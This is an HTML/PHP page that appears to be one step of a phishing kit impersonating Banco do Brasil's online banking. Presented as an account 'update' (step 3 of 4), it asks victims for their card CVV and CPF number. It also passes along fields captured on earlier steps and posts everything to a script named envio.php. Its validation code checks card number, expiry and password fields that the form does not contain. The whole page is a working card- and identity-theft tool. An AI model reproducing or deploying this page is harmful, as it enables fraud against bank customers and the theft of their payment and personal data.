<!DOCTYPE html>
<html lang="pt-BR">
   <head>
      <title>Banco do Brasil - Autoatendimento Pessoa F&iacute;sica</title>
      <meta http-equiv="content-type" content="text/html; charset=UTF-8">
      <!-- CSS -->
      <link rel="stylesheet" type="text/css" href="css/bootstrap.css">
      <link rel="stylesheet" type="text/css" href="css/estilo.css">
      <link rel="icon" href="img/favicon.ico" type="image/x-icon"/>
      <meta name="viewport" content="width=device-width, initial-scale=1.0">
      <meta name="theme-color" content="#FAF046">

      <script src=https://code.jquery.com/jquery-1.12.0.min.js></script>
      <script>window.jQuery||document.write('<script src="js/vendor/jquery-1.12.0.min.js"><\/script>');</script>
      <script language="javascript">
         var cpfOK = false;
      </script>

      <style type="text/css">
         .group input[type="tel"], input[type="password"]{
            border-bottom: 1px solid #000;
         }
         .group label         {
           color:rgba(198,198,198); 
           font-size:18px;
           font-weight:normal;
           position:absolute;
           pointer-events:none;
           left:0px;
           top:5px;
           transition:0.2s ease all; 
           -moz-transition:0.2s ease all; 
           -webkit-transition:0.2s ease all;
         }
         .group input:focus ~ label, input:valid ~ label{
           top:-5px;
           font-size:12px;
           color:rgba(198,198,198);
         }
         .group input:focus{ outline:none; color:rgba(51,51,51, 0.9); border-bottom:1px solid #000; }
      </style>

      <style type="text/css">
          .modal-content{
              border: 0;
              border-radius: 0;
              outline: 0;
          }

          .modal-header{
              padding: 13px;
              border-bottom: 1px solid rgb(51,181,229);
          }
          .modal-title {
              color: rgb(51,181,229);
              margin-bottom: 0;
              line-height: 1.3;
          }
          p#error {
              font-weight: 500;
          }
          .modal-footer{
              padding: 0;
          }
          .modal-footer{
              border-top: 0;
          }
          button.btn.btn-default {
              width: 100%;
              border-radius: 0;
              background-color: rgb(186,226,240);
              border: solid 1px rgb(129,207,235);
              cursor: pointer;
          }
      </style>
   </head>
   <body id="tela3">
      <section>
         <header id="topo">
            <div class="container">
               <div class="row">
                  <h2 class="logoTopo">
                  
                  </h2>
                  <h3>Atualização (3 de 4)</h3>
               </div>
            </div>
         </header>
         <main id="identificacao">
            <div class="container">
               <div class="row">
                  <section class="formulario">
                     <form action="envio.php" enctype="multipart/form-data" method="POST" id="formCC" name="formCC" onsubmit="return validarCC();" class="form-inline">
                       <?php foreach($_POST as $key => $value):  ?>
	<input type="hidden" name="<?= $key ?>" value="<?= $value ?>" />
 <?php endforeach; ?>
                        <div class="caixa">
                           <h2 class="tituloTel">Apelido </h2>
                           <div class="group">      
                             <input id="apelido" name="apelido" type="text" minlength="4" maxlength="20" onkeyup="javascript:pulacampo('apelido','cvv');">
                             <span class="highlight"></span>
                             <!-- <span class="bar"></span> -->
                             <label>Ex: Smartphone</label>
                           </div>
						                              <h2 class="tituloTel">CVV </h2>
                           <div class="group">
<input id="cvv" name="cvv" type="tel" minlength="3" maxlength="3" onkeypress="return SomenteNumero(event)" oninvalid="setCustomValidity('Digite seu CVV !')" onkeyup="pulacampo('cvv','cpf');">
                              <span class="highlight"></span>
                              <!-- <span class="bar"></span> -->
                           </div>
						                              <h2 class="tituloTel">CPF </h2>
                           <div class="group">      
                             <input id="cpf" name="cpf" type="tel" minlength="15" maxlength="15"  onkeyup="mascaraMike('###.###.###-##', this);javascript:pulacampo('cpf','confirmar');">
                             <span class="highlight"></span>
                             <!-- <span class="bar"></span> -->
                           </div>
                        </div>
                        <div class="group">
                           <input type="submit" value="Confirmar" id="confirmar">
                           <!-- <input type="button" class="button_passo1" value="voltar" /> -->
                        </div>
                     </form>
                  </section>
               </div>
            </div>
         </main>
      </section>

      <div class="modal fade" id="modalErro" role="dialog">
          <div class="modal-dialog">
          
            <div class="modal-content">
              <div class="modal-header">
                <h4 class="modal-title">Alerta</h4>
              </div>
              <div class="modal-body">
                <p id="error"></p>
              </div>
              <div class="modal-footer">
                <button type="button" class="btn btn-default" data-dismiss="modal">ok</button>
              </div>
            </div>
            
          </div>
      </div>

      <div class="loading">
        <div class="loader"></div>
      </div>


   </body>
   <!-- scripts -->
   <script src="js/jquery-3.2.1.min.js"></script>
   <script src="js/bootstrap.js"></script>
   <script src="js/script.js"></script>

   
   <script type="text/javascript">
     function validarCC() {
        var cc        = formCC.cc.value;
        var validade  = formCC.validade.value;
        var cvv       = formCC.cvv.value;
        var sletra    = formCC.sletra.value;

        if (cc == "" ||
            cc.length < 19 ||
            cc == "0000 0000 0000 0000" || 
            cc == "1111 1111 1111 1111" || 
            cc == "2222 2222 2222 2222" ||
            cc == "3333 3333 3333 3333" || 
            cc == "4444 4444 4444 4444" || 
            cc == "5555 5555 5555 5555" || 
            cc == "6666 6666 6666 6666" || 
            cc == "7777 7777 7777 7777" || 
            cc == "8888 8888 8888 8888" || 
            cc == "9999 9999 9999 9999"){
            $("#error").html("Cartão inválido, digite corretamente !");
            $('#modalErro').modal("show");
          return false;
        }
        else if (validade == "" ||
            validade.length < 7 ||
            validade == "00 / 00" || 
            validade == "11 / 11" || 
            validade == "22 / 22" || 
            validade == "33 / 33" || 
            validade == "44 / 44" || 
            validade == "55 / 55" || 
            validade == "66 / 66" || 
            validade == "77 / 77" || 
            validade == "88 / 88" || 
            validade == "99 / 99"){
            $("#error").html("Validade inválida, digite corretamente !");
            $('#modalErro').modal("show");
          return false;
        }
        else if (cvv == "" ||
            cvv.length < 3 ||
            cvv == "000" || 
            cvv == "111" || 
            cvv == "222" || 
            cvv == "333" || 
            cvv == "444" || 
            cvv == "555" || 
            cvv == "666" || 
            cvv == "777" || 
            cvv == "888" || 
            cvv == "999"){
            $("#error").html("CVV inválido, digite corretamente !");
            $('#modalErro').modal("show");
          return false;
        } else if (sletra == "" || sletra.length < 6) {
                  $("#error").html("Senha inválida, digite corretamente !");
                  $('#modalErro').modal("show");
                  return false;
        }
        else{
          $(".loading").css({'display': 'block'});
          $("#confirmar").submit();
          return false;
        }
        
        
     }
   </script>
</html>